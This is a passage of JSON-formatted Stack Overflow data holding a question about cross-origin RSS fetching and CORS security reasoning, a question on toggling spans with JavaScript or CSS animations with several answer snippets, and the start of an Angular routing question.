77, "profile_image": "https://www.gravatar.com/avatar/d33f775e247c3d197bda319a33232403?s=128&d=identicon&r=PG", "display_name": "tofarr", "link": "https://stackoverflow.com/users/470062/tofarr"}, "reply_to_user": {"reputation": 10321, "user_id": 215552, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/26bda02894d869c95f620de4b7cd386d?s=128&d=identicon&r=PG", "display_name": "Heretic Monkey", "link": "https://stackoverflow.com/users/215552/heretic-monkey"}, "edited": false, "score": 0, "creation_date": 1558614941, "post_id": 56265296, "comment_id": 99165126, "body": "I am not sure what you mean by &quot;having requests diverted to another domain&quot;. How are requests diverted? Do you mean by script injection, or by a malicious website? Given a situation where cookies and authentication are blocked, how would this threaten the user?"}, {"owner": {"reputation": 10321, "user_id": 215552, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/26bda02894d869c95f620de4b7cd386d?s=128&d=identicon&r=PG", "display_name": "Heretic Monkey", "link": "https://stackoverflow.com/users/215552/heretic-monkey"}, "edited": false, "score": 0, "creation_date": 1558615610, "post_id": 56265296, "comment_id": 99165525, "body": "You can read all about CORS on the internet. The <a href=\"https://w3c.github.io/webappsec-cors-for-developers/\" rel=\"nofollow noreferrer\">W3C page on CORS for Developers</a> gives a good explanation of the reasons and history as to why it was created. The <a href=\"https://www.w3.org/TR/cors/\" rel=\"nofollow noreferrer\">standard itself</a> goes into detail on the mechanics. You might also look at other questions on Stack Overflow; for instance, over in the Related section of this page is <a href=\"https://stackoverflow.com/a/4850752/215552\">Is CORS a secure way to do cross-domain AJAX requests?</a> which goes into some of these questions."}], "owner": {"reputation": 7078, "user_id": 470062, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/d33f775e247c3d197bda319a33232403?s=128&d=identicon&r=PG", "display_name": "tofarr", "link": "https://stackoverflow.com/users/470062/tofarr"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 88, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1558629059, "creation_date": 1558560745, "last_edit_date": 1558629059, "question_id": 56265296, "link": "https://stackoverflow.com/questions/56265296/is-there-a-way-to-load-cross-origin-request-without-explicit-cors-headers-set-on", "title": "Is there a way to load cross origin request without explicit CORS headers set on the server side?", "body": "<p>I am trying to write an RSS feed consumer in JavaScript, but unfortunately most feeds do not seem to explicitly set an access-control-allow-origin header on their responses (Even though it is my understanding that the data is for public consumption / scraping).</p>\n\n<p>My question is: Is there a way to load data like this in javascript (Aside from using a server side proxy or turning the project into a browser plugin) given that:</p>\n\n<ul>\n<li>The requests are simple get requests. (So no OPTIONS request would normally be sent even if the access-control-allow-origin header was present)</li>\n<li>Cookies / Authentication is not important as the feeds are public. (So withCredentials would be false if it were an XMLHttpRequest)</li>\n</ul>\n\n<p>e.g. Something like:</p>\n\n<pre><code>fetch('http://rss.slashdot.org/Slashdot/slashdotMain', {\n  crossOrigin: false,\n  xhrFields: {\n    withCredentials: false\n  }\n})).then(function(response){\n  console.log('Got a response!', response);\n});\n</code></pre>\n\n<h2>Update</h2>\n\n<p>The second part of my question is: Why is this not allowed?</p>\n\n<p>For example: Suppose I for whatever reason navigate to a domain malicious-website.com. It sends a simple Ajax GET request including <code>withCredentials: false</code> to my-bank.com. my-bank.com processes this request, but then the browser blocks the response.</p>\n\n<p>How does blocking the response to this get request improve security?</p>\n\n<ul>\n<li>It does not matter if I am logged in to my-bank.com in a different tab, as no cookies or authorization header is send as per the <code>withCredentials: false</code> directive. The classic XSRF scenario has already been prevented - this request is exactly as if any other user on the internet [including a malicious one] had loaded this resource.</li>\n<li>If there was an authentication token in the URL (Such as JWT) then malicious-website.com already has this and can potentially store it for their own use later - blocking this particular response does not change this.</li>\n<li>It does not protect the data on my-bank.com since it does not block the request, just the response - if they have a REST style resource that performs an update in response to that GET then I am going to have a bad time. i.e.: The classic CSRF is not prevented unless my-bank.com requires a non simple request on updates (A POST or request with headers so that an OPTIONS request is sent first)</li>\n</ul>\n\n<p>So again, what good does blocking just the response actually do here?</p>\n\n<p>I guess the answer I was looking for was along the lines of: \"If simple <code>withCredentials: false</code> requests were also allowed to subvert the same origin policy then a bad actor could do X\".</p>\n\n<p>Any ideas on what that X is?</p>\n"}, {"tags": ["javascript", "html", "css"], "comments": [{"owner": {"reputation": 259, "user_id": 10136560, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-G1KRTyhGFh4/AAAAAAAAAAI/AAAAAAAAUxs/RzYlXgnLKl4/photo.jpg?sz=128", "display_name": "aaron lilly", "link": "https://stackoverflow.com/users/10136560/aaron-lilly"}, "edited": false, "score": 0, "creation_date": 1558561504, "post_id": 56265288, "comment_id": 99147155, "body": "this is probably an image insted of text, and a carosel changing the image.- do this but make it automatic - <a href=\"https://www.w3schools.com/bootstrap/bootstrap_carousel.asp\" rel=\"nofollow noreferrer\">w3schools.com/bootstrap/bootstrap_carousel.asp</a>"}], "answers": [{"comments": [{"owner": {"reputation": 11081, "user_id": 10669010, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/LsWex.png?s=128&g=1", "display_name": "Mister Jojo", "link": "https://stackoverflow.com/users/10669010/mister-jojo"}, "edited": false, "score": 0, "creation_date": 1558563371, "post_id": 56265422, "comment_id": 99147642, "body": "document.querySelectorAll  accept forEach, no need to use Array.from(document.querySelectorAll .."}, {"owner": {"reputation": 4237, "user_id": 10787900, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-4Z6j7Qhowx8/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-ighhCw1JxvK6l7ZVG0ZYElO2DSUA/mo/photo.jpg?sz=128", "display_name": "Bibberty", "link": "https://stackoverflow.com/users/10787900/bibberty"}, "reply_to_user": {"reputation": 11081, "user_id": 10669010, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/LsWex.png?s=128&g=1", "display_name": "Mister Jojo", "link": "https://stackoverflow.com/users/10669010/mister-jojo"}, "edited": false, "score": 0, "creation_date": 1558563547, "post_id": 56265422, "comment_id": 99147693, "body": "@MisterJojo yes, I was not sure if it had <code>length</code>"}], "tags": [], "owner": {"reputation": 4237, "user_id": 10787900, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-4Z6j7Qhowx8/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-ighhCw1JxvK6l7ZVG0ZYElO2DSUA/mo/photo.jpg?sz=128", "display_name": "Bibberty", "link": "https://stackoverflow.com/users/10787900/bibberty"}, "is_accepted": true, "score": 3, "last_activity_date": 1558561433, "creation_date": 1558561433, "answer_id": 56265422, "question_id": 56265288, "link": "https://stackoverflow.com/questions/56265288/automatically-toggle-between-spans/56265422#56265422", "title": "Automatically toggle between spans", "body": "<p>Here is an example using setInterval</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>let i=0;\r\nconst items = Array.from(document.querySelectorAll('.items span'));\r\n\r\nconst showNewItem = (index) =&gt; {\r\n  items.forEach(i =&gt; i.style.display = 'none');\r\n  \r\n  items[index].style.display = 'inline';\r\n}\r\n\r\n// Initial call\r\nshowNewItem(i++);\r\n\r\nsetInterval(() =&gt; {\r\n  showNewItem(i++);\r\n  if(i &gt; items.length-1) i = 0;\r\n},1000);</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;p class=\"itemlist\"&gt;We sell\r\n    &lt;span class=\"items\"&gt;\r\n      &lt;span&gt;Bread&lt;/span&gt;\r\n      &lt;span&gt;Milk&lt;/span&gt;\r\n      &lt;span&gt;Fish&lt;/span&gt;\r\n      &lt;span&gt;Eggs&lt;/span&gt;\r\n      &lt;span&gt;Cheese&lt;/span&gt;\r\n    &lt;/span&gt;\r\n  &lt;/p&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"tags": [], "owner": {"reputation": 11081, "user_id": 10669010, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/LsWex.png?s=128&g=1", "display_name": "Mister Jojo", "link": "https://stackoverflow.com/users/10669010/mister-jojo"}, "is_accepted": false, "score": 0, "last_activity_date": 1558563163, "last_edit_date": 1558563163, "creation_date": 1558561746, "answer_id": 56265475, "question_id": 56265288, "link": "https://stackoverflow.com/questions/56265288/automatically-toggle-between-spans/56265475#56265475", "title": "Automatically toggle between spans", "body": "<p>yes setInterval is the key\n[edit] text is now centered</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>const All_span = document.querySelectorAll('p.itemlist span.items span');\r\nvar NoSpan = 0;\r\n\r\nsetInterval(() =&gt; {\r\n    All_span[NoSpan++].style.display = 'none';\r\n    NoSpan %= All_span.length;\r\n    All_span[NoSpan].style.display = 'inline';\r\n}, 900);</code></pre>\r\n<pre class=\"snippet-code-css lang-css prettyprint-override\"><code>p.itemlist {\r\n\tfont: 2em Verdana, Geneva, Arial, Helvetica, sans-serif;\r\n\tdisplay: block;\r\n\twidth: 8em;\r\n\ttext-align: center;\r\n}\r\np.itemlist span.items span {\r\n\tdisplay: none;\r\n\tcolor:crimson;\r\n}\r\np.itemlist span.items span:first-child {\r\n    display: inline;\r\n}</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;p class=\"itemlist\"&gt;We sell\r\n\t&lt;span class=\"items\"&gt;\r\n\t\t&lt;span&gt;Bread&lt;/span&gt;\r\n\t\t&lt;span&gt;Milk&lt;/span&gt;\r\n\t\t&lt;span&gt;Fish&lt;/span&gt;\r\n\t\t&lt;span&gt;Eggs&lt;/span&gt;\r\n\t\t&lt;span&gt;Cheese&lt;/span&gt;\r\n\t&lt;/span&gt;\r\n&lt;/p&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"tags": [], "owner": {"reputation": 905, "user_id": 2941150, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000204192981/picture?type=large", "display_name": "Kuldeep Bhimte", "link": "https://stackoverflow.com/users/2941150/kuldeep-bhimte"}, "is_accepted": false, "score": 0, "last_activity_date": 1558562000, "creation_date": 1558562000, "answer_id": 56265508, "question_id": 56265288, "link": "https://stackoverflow.com/questions/56265288/automatically-toggle-between-spans/56265508#56265508", "title": "Automatically toggle between spans", "body": "<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>var itemArray = ['Bread', 'Milk', 'Fish', 'Eggs', 'Cheese'];\r\nvar animationInterval;\r\n\r\nfunction getRandomInt(max) {\r\n  return Math.floor(Math.random() * Math.floor(max));\r\n}\r\n\r\nfunction setItemName(_name) {\r\n  var itemList = document.getElementsByClassName('items')[0];\r\n  itemList.textContent = _name;\r\n}\r\n\r\nfunction startAnimation() {\r\n  animationInterval = setInterval(function(){\r\n    var randomNumber = getRandomInt(itemArray.length);\r\n    setItemName(itemArray[randomNumber]);\r\n  }, 1000)\r\n}\r\n\r\nfunction endAnimation() {\r\n  clearInterval(animationInterval);\r\n}\r\n\r\nsetItemName(itemArray[0]);</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;p class=\"itemlist\"&gt;We sell\r\n    &lt;span class=\"items\"&gt;&lt;/span&gt;\r\n &lt;/p&gt;\r\n  \r\n&lt;button onclick=\"startAnimation();\"&gt; Start &lt;/button&gt;\r\n&lt;button onclick=\"endAnimation();\"&gt; End &lt;/button&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"tags": [], "owner": {"reputation": 304, "user_id": 11467301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/26f79ba9e117ea8e7d9fb636092f9f02?s=128&d=identicon&r=PG&f=1", "display_name": "Sina", "link": "https://stackoverflow.com/users/11467301/sina"}, "is_accepted": false, "score": 1, "last_activity_date": 1558562247, "creation_date": 1558562247, "answer_id": 56265540, "question_id": 56265288, "link": "https://stackoverflow.com/questions/56265288/automatically-toggle-between-spans/56265540#56265540", "title": "Automatically toggle between spans", "body": "<p>You can add a delay. here is a sample code for that</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;!DOCTYPE html&gt;\r\n&lt;html&gt;\r\n&lt;body&gt;\r\n\r\n\r\n \r\n\r\n &lt;p class=\"itemlist\"&gt;We sell\r\n    &lt;span class=\"items\"&gt;\r\n      &lt;span id=\"demo\"&gt; Bread&lt;/span&gt;\r\n      \r\n    &lt;/span&gt;\r\n  &lt;/p&gt;\r\n\r\n&lt;script&gt;\r\n \r\n \r\n\r\nvar delayInMilliseconds1 = 1000; \r\nvar delayInMilliseconds2 = 2000; \r\nvar delayInMilliseconds3 = 3000; \r\n\r\nsetTimeout(function() {\r\n    document.getElementById(\"demo\").innerHTML = \"Milk\";\r\n}, delayInMilliseconds1);\r\n\r\nsetTimeout(function() {\r\n    document.getElementById(\"demo\").innerHTML = \"Fish\";\r\n}, delayInMilliseconds2);\r\n\r\nsetTimeout(function() {\r\n    document.getElementById(\"demo\").innerHTML = \"Eggs\";\r\n}, delayInMilliseconds3);\r\n\r\n&lt;/script&gt;\r\n\r\n&lt;/body&gt;\r\n&lt;/html&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"tags": [], "owner": {"reputation": 1870, "user_id": 6301806, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/AfP7H.png?s=128&g=1", "display_name": "WilliamNHarvey", "link": "https://stackoverflow.com/users/6301806/williamnharvey"}, "is_accepted": false, "score": 0, "last_activity_date": 1558562248, "creation_date": 1558562248, "answer_id": 56265541, "question_id": 56265288, "link": "https://stackoverflow.com/questions/56265288/automatically-toggle-between-spans/56265541#56265541", "title": "Automatically toggle between spans", "body": "<p>Set an item to start on using a class like \"first\"</p>\n\n<p>Using jQuery, grab the items list, and set an interval to go through. Then fadeout the current active and fadein the next one.</p>\n\n<p>Find the next element either just by grabbing the next sibling, or grabbing the first child of the items list if you reach the end.</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>let itemsList = $(\".items\").first();\r\n\r\nconst changeItem = () =&gt; {\r\n  let current = itemsList.find(\"span.active\");\r\n  current.removeClass(\"active\");\r\n  current.fadeOut(200, () =&gt; {\r\n    let next;\r\n    if (current.next().length &gt; 0) next = current.next();\r\n    else next = itemsList.children().first();\r\n    next.addClass(\"active\");\r\n    next.fadeIn(200);\r\n  });\r\n}\r\n\r\nsetInterval(changeItem, 2000);</code></pre>\r\n<pre class=\"snippet-code-css lang-css prettyprint-override\"><code>.items span {\r\n  color: red;\r\n  display: none;\r\n}\r\n\r\nspan.first {\r\n  display: inline-block;\r\n}</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js\"&gt;&lt;/script&gt;\r\n&lt;p class=\"itemlist\"&gt;We sell\r\n    &lt;span class=\"items\"&gt;\r\n      &lt;span class=\"active first\"&gt;Bread&lt;/span&gt;\r\n      &lt;span&gt;Milk&lt;/span&gt;\r\n      &lt;span&gt;Fish&lt;/span&gt;\r\n      &lt;span&gt;Eggs&lt;/span&gt;\r\n      &lt;span&gt;Cheese&lt;/span&gt;\r\n    &lt;/span&gt;\r\n  &lt;/p&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"tags": [], "owner": {"reputation": 330, "user_id": 2496613, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JAX2S.jpg?s=128&g=1", "display_name": "Sharan Arumugam", "link": "https://stackoverflow.com/users/2496613/sharan-arumugam"}, "is_accepted": false, "score": 0, "last_activity_date": 1558563059, "creation_date": 1558563059, "answer_id": 56265649, "question_id": 56265288, "link": "https://stackoverflow.com/questions/56265288/automatically-toggle-between-spans/56265649#56265649", "title": "Automatically toggle between spans", "body": "<p>How about decoupling data from HTML? and use <code>setInterval</code> then</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>const itemList = ['Bread', 'Milk', 'Fish']\r\nconst prefix = \"We Sell\"\r\n\r\nconst placeholder = document.getElementById('placeholder');\r\nlet index = 0;\r\n\r\nsetInterval(() =&gt; {\r\n  index = index &gt;= itemList.length ? 0 : index;\r\n\r\n  placeholder.innerHTML = `${prefix} &lt;span style='color: red'&gt; ${itemList[index]} &lt;/span&gt;`;\r\n\r\n  index++;\r\n}, 1000)</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;div id=\"placeholder\" /&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"tags": [], "owner": {"reputation": 85012, "user_id": 2442099, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Jtx0O.jpg?s=128&g=1", "display_name": "G-Cyrillus", "link": "https://stackoverflow.com/users/2442099/g-cyrillus"}, "is_accepted": false, "score": 0, "last_activity_date": 1558568001, "last_edit_date": 1558568001, "creation_date": 1558566653, "answer_id": 56266100, "question_id": 56265288, "link": "https://stackoverflow.com/questions/56265288/automatically-toggle-between-spans/56266100#56266100", "title": "Automatically toggle between spans", "body": "<p>For info, you could also use <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/Using_CSS_custom_properties\" rel=\"nofollow noreferrer\">CSS variable</a> and <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Animations/Using_CSS_animations\" rel=\"nofollow noreferrer\">CSS animation</a></p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-css lang-css prettyprint-override\"><code>span {\r\n  display: inline-block;\r\n  vertical-align: top;\r\n}\r\n\r\n.items span {\r\n  position: absolute;/* instead display */\r\n  animation: var(--delay, 0) 10s hidsh linear infinite;\r\n}\r\n\r\n@keyframes hidsh {\r\n  0%,\r\n  80% {\r\n    color: transparent;\r\n  }\r\n  80.1%,\r\n  100% {\r\n    color: initial\r\n  }</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;p class=\"itemlist\"&gt;We sell\r\n  &lt;span class=\"items\"&gt;\r\n      &lt;span style='--delay:-2s' &gt;Bread &lt;/span&gt;\r\n  &lt;span style='--delay:-4s'&gt;Milk  &lt;/span&gt;\r\n  &lt;span style='--delay:-6s'&gt;Fish  &lt;/span&gt;\r\n  &lt;span style='--delay:-8s'&gt;Eggs  &lt;/span&gt;\r\n  &lt;span style='--delay:-10s'&gt;Cheese&lt;/span&gt;\r\n  &lt;/span&gt;\r\n&lt;/p&gt;</code></pre>\r\n</div>\r\n</div>\r\n\n You may also declare the custom properties in the style sheet if you do not want to touch the HTML</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-css lang-css prettyprint-override\"><code>.items span              {--delay:-2s }\r\n.items span:nth-child(2) {--delay:-4s }\r\n.items span:nth-child(3) {--delay:-6s }\r\n.items span:nth-child(4) {--delay:-8s }\r\n.items span:nth-child(5) {--delay:-10s}\r\nspan {\r\n  display: inline-block;\r\n  vertical-align: top;\r\n}\r\n\r\n.items span {\r\n  position: absolute;/* instead display*/\r\n  animation: var(--delay, 0) 10s hidsh linear infinite;\r\n}\r\n\r\n@keyframes hidsh {\r\n  0%,\r\n  80% {\r\n    color: transparent;/* instead visibility or opacity */\r\n  }\r\n  80.1%,\r\n  100% {\r\n    color: initial\r\n  }</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;p class=\"itemlist\"&gt;We sell\r\n  &lt;span class=\"items\"&gt;\r\n   &lt;span&gt;Bread &lt;/span&gt;\r\n   &lt;span&gt;Milk  &lt;/span&gt;\r\n   &lt;span&gt;Fish  &lt;/span&gt;\r\n   &lt;span&gt;Eggs  &lt;/span&gt;\r\n   &lt;span&gt;Cheese&lt;/span&gt;\r\n  &lt;/span&gt;\r\n&lt;/p&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}], "owner": {"reputation": 81, "user_id": 11541757, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aacd40290c19c8e56301e0a716140119?s=128&d=identicon&r=PG&f=1", "display_name": "tryingtogethelp", "link": "https://stackoverflow.com/users/11541757/tryingtogethelp"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 69, "favorite_count": 0, "accepted_answer_id": 56265422, "answer_count": 7, "score": 1, "last_activity_date": 1558568001, "creation_date": 1558560710, "question_id": 56265288, "link": "https://stackoverflow.com/questions/56265288/automatically-toggle-between-spans", "title": "Automatically toggle between spans", "body": "<p>I can't find any answers that allow for <code>sentence here</code> followed by <code>end word</code></p>\n\n<p>The idea is that I'll have a list of items in a spans and then toggle between them, so the beginning of the sentence is the same and only the end changes. Ideally there would be some sort of animation but even just the functionality would be appreciated.</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;p class=\"itemlist\"&gt;We sell\r\n    &lt;span class=\"items\"&gt;\r\n      &lt;span&gt;Bread&lt;/span&gt;\r\n      &lt;span&gt;Milk&lt;/span&gt;\r\n      &lt;span&gt;Fish&lt;/span&gt;\r\n      &lt;span&gt;Eggs&lt;/span&gt;\r\n      &lt;span&gt;Cheese&lt;/span&gt;\r\n    &lt;/span&gt;\r\n  &lt;/p&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>Ideally I'd like it to show one item at a time. The end result would look like the GIF below but the text should remain in the same place.</p>\n\n<p><a href=\"https://i.stack.imgur.com/7S7Hl.gif\" rel=\"nofollow noreferrer\">Gif of intention.</a></p>\n\n<p>Any prompts/answers would be greatly appreciated. I'm tearing my hair out for two hours over this.</p>\n\n<p>Thanks in advance.</p>\n"}, {"tags": ["javascript", "angular", "rest", "http"], "comments": [{"owner": {"reputation": 64, "user_id": 2485318, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b7a5219d1a69c9c677e9193116c6dce?s=128&d=identicon&r=PG", "display_name": "Muhammad Faisal", "link": "https://stackoverflow.com/users/2485318/muhammad-faisal"}, "edited": false, "score": 0, "creation_date": 1558561022, "post_id": 56265269, "comment_id": 99146999, "body": "Can you please share the routing module where you defined app routing?"}, {"owner": {"reputation": 309, "user_id": 10719853, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-hlafNSlsL_0/AAAAAAAAAAI/AAAAAAAACJM/bEomlaQeUnM/photo.jpg?sz=128", "display_name": "Uros Kalajdzic", "link": "https://stackoverflow.com/users/10719853/uros-kalajdzic"}, "reply_to_user": {"reputation": 64, "user_id": 2485318, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b7a5219d1a69c9c677e9193116c6dce?s=128&d=identicon&r=PG", "display_name": "Muhammad Faisal", "link": "https://stackoverflow.com/users/2485318/muhammad-faisal"}, "edited": false, "score": 0, "creation_date": 1558561255, "post_id": 56265269, "comment_id": 99147080, "body": "App routing module <a href=\"https://codeshare.io/adb86B\" rel=\"nofollow noreferrer\">codeshare.io/adb86B</a> @MuhammadFaisal"}, {"owner": {"reputation": 64, "user_id": 2485318, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b7a5219d1a69c9c677e9193116c6dce?s=128&d=identicon&r=PG", "display_name": "Muhammad Faisal", "link": "https://stackoverflow.com/users/2485318/muhammad-faisal"}, "edited": false, "score": 0, "creation_date": 1558561714, "post_id": 56265269, "comment_id": 99147199, "body": "You must use the following line of code if you want to refetch data on the same URL"}, {"owner": {"reputation": 64, "user_id": 2485318, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b7a5219d1a69c9c677e9193116c6dce?s=128&d=identicon&r=PG", "display_name": "Muhammad Faisal", "link": "https://stackoverflow.com/users/2485318/muhammad-faisal"}, "edited": false, "score": 0, "creation_date": 1558561719, "post_id": 56265269, "comment_id": 99147200, "body": "imports: [RouterModule.forRoot(routes, {onSameUrlNavigation: &#39;reload&#39;})]"}, {"owner": {"reputation": 309, "user_id": 10719853, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-hlafNSlsL_0/AAAAAAAAAAI/AAAAAAAACJM/bEomlaQeUnM/photo.jpg?sz=128", "display_name": "Uros Kalajdzic", "link": "https://stackoverflow.com/users/10719853/uros-kalajdzic"}, "reply_to_user": {"reputation": 64, "user_id": 2485318, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b7a5219d1a69c9c677e9193116c6dce?s=128&d=identicon&r=PG", "display_name": "Muhammad Faisal", "link": "https://stackoverflow.com/users/2485318/muhammad-faisal"}, "edited": false, "score": 0, "creation_date": 1558561961, "post_id": 56265269, "comment_id": 99147261, "body": "not working, it&#39;s same but just got hash in front"}, {"owner": {"reputation": 64, "user_id": 2485318, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b7a5219d1a69c9c677e9193116c6dce?s=128&d=identicon&r=PG", "display_name": "Muhammad Faisal", "link": "https://stackoverflow.com/users/2485318/muhammad-faisal"}, "edited": false, "score": 0, "creation_date": 1558561988, "post_id": 56265269, "comment_id": 99147269, "body": "remove useHash:true"}, {"owner": {"reputation": 64, "user_id": 2485318, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b7a5219d1a69c9c677e9193116c6dce?s=128&d=identicon&r=PG", "display_name": "Muhammad Faisal", "link": "https://stackoverflow.com/users/2485318/muhammad-faisal"}, "edited": false, "score": 0, "creation_date": 1558562009, "post_id": 56265269, "comment_id": 99147277, "body": "Can you show the running example on stackblitz?"}, {"owner": {"reputation": 64, "user_id": 2485318, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b7a5219d1a69c9c677e9193116c6dce?s=128&d=identicon&r=PG", "display_name": "Muhammad Faisal", "link": "https://stackoverflow.com/users/2485318/muhammad-faisal"}, "edited": false, "score": 0, "creation_date": 1558562133, "post_id": 56265269, "comment_id": 99147310, "body": "Please refer to URL for more details <a href=\"https://blog.angularindepth.com/refresh-current-route-in-angular-512a19d58f6e\" rel=\"nofollow noreferrer\">blog.angularindepth.com/&hellip;</a>"}, {"owner": {"reputation": 15130, "user_id": 1679126, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/82c8608808b8c4c719e9d0c71fb5c366?s=128&d=identicon&r=PG", "display_name": "Adrian Brand", "link": "https://stackoverflow.com/users/1679126/adrian-brand"}, "edited": false, "score": 0, "creation_date": 1558589372, "post_id": 56265269, "comment_id": 99152405, "body": "Have a read of my article on Angular state management with my library ngx-RxCache <a href=\"https://medium.com/@adrianbrand/angular-state-management-with-rxcache-468a865fc3fb\" rel=\"nofollow noreferrer\">medium.com/@adrianbrand/&hellip;</a>"}, {"owner": {"reputation": 309, "user_id": 10719853, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-hlafNSlsL_0/AAAAAAAAAAI/AAAAAAAACJM/bEomlaQeUnM/photo.jpg?sz=128", "display_name": "Uros Kalajdzic", "link": "https://stackoverflow.com/users/10719853/uros-kalajdzic"}, "edited": false, "score": 0, "creation_date": 1558614970, "post_id": 56265269, "comment_id": 99165140, "body": "this.activeRoute.queryParams.subscribe(queryParams =&gt; { \t\t// do something with the query params \t}); \tthis.activeRoute.params.subscribe(routeParams =&gt; { \t\tthis.loadUserDetail(routeParams.id); \t}); ..........this code works just it&#39;s very slow"}], "answers": [{"comments": [{"owner": {"reputation": 309, "user_id": 10719853, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-hlafNSlsL_0/AAAAAAAAAAI/AAAAAAAACJM/bEomlaQeUnM/photo.jpg?sz=128", "display_name": "Uros Kalajdzic", "link": "https://stackoverflow.com/users/10719853/uros-kalajdzic"}, "edited": false, "score": 0, "creation_date": 1558614863, "post_id": 56266601, "comment_id": 99165080, "body": "Still nothing...This is one component just want to re-render new data again after button click @Nikhil thank you for your effort"}, {"owner": {"reputation": 309, "user_id": 10719853, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-hlafNSlsL_0/AAAAAAAAAAI/AAAAAAAACJM/bEomlaQeUnM/photo.jpg?sz=128", "display_name": "Uros Kalajdzic", "link": "https://stackoverflow.com/users/10719853/uros-kalajdzic"}, "edited": false, "score": 0, "creation_date": 1558615007, "post_id": 56266601, "comment_id": 99165161, "body": "this.activeRoute.queryParams.subscribe(queryParams =&gt; { // do something with the query params }); this.activeRoute.params.subscribe(routeParams =&gt; { this.loadUserDetail(routeParams.id); }); ..........this code works just it&#39;s very slow"}, {"owner": {"reputation": 5947, "user_id": 2924577, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/c499286ca761a5b21f3744ca229dffb0?s=128&d=identicon&r=PG&f=1", "display_name": "Nikhil", "link": "https://stackoverflow.com/users/2924577/nikhil"}, "reply_to_user": {"reputation": 